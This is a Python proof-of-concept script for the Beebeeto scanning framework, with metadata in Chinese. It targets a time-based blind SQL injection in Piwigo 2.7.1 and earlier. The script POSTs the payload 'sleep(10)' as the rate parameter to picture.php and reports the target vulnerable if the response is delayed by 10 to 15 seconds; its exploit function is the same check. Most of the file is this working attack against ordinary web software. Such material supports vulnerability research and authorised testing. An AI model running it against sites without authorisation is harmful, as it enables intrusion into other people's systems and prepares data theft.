#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from time import time
from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0221',
            'name': 'Piwigo <= v2.7.1 /functions_rate.inc.php SQL注入漏洞 POC',
            'author': '雷锋',
            'create_date': '2014-12-28',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Piwigo',
            'vul_version': ['<=2.7.1'],
            'type': 'SQL Injection',
            'tag': ['Piwigo漏洞', 'SQL注入漏洞', '/functions_rate.inc.php', 'php'],
            'desc': '''
                    由于functions_rate.inc.php文件中的rate_picture函数没有对传入的$rate变量
                    进行过滤，直接拼接到SQL中执行。
                    ''',
            'references': ['http://www.freebuf.com/articles/web/55075.html',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = '%s/picture.php?/3/category/1/&action=rate' % args['options']['target']
        data = {'rate':'sleep(10)'}
        req = urllib2.Request(verify_url)
        data = urllib.urlencode(data)
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        a = time();
        response = opener.open(req, data)
        b = time();
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        c = b-a
        if c>=10 and c<=15:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())